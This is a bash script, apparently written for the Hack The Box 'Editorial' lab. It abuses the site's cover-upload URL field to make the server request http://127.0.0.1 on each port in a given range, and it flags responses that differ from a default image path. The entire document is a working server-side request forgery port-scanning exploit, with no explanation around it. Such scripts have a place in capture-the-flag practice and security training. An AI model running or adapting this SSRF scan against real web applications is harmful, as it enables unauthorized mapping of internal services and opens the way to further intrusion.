#!/bin/bash

badresponse='/static/images/unsplash_photo_1630734277837_ebe62757b6e0.jpeg'

min=$1
max=$2

for i in $(seq $1 $2); do
  result=$(curl -s -q -X 'POST' http://editorial.htb/upload-cover \
      -H 'Host: editorial.htb' \
      -H 'Accept: */*' \
      -H 'Accept-Language: en-US,en;q=0.5' \
      -F "bookurl=http://127.0.0.1:$i" \
      -F 'bookfile=@~/editorial/www/NoMachine-recording.png' \
      -H 'Origin: http://editorial.htb' \
      -H 'Connection: close' \
      -H 'Referer: http://editorial.htb/upload' \
      --output -)
  if [[ $result != $badresponse ]]; then
    echo -e path=$result port=$i len=$(echo -n $result | wc -c) #| tee -a ssrfscan-$1-$2.txt;
  fi
done
exit 0;
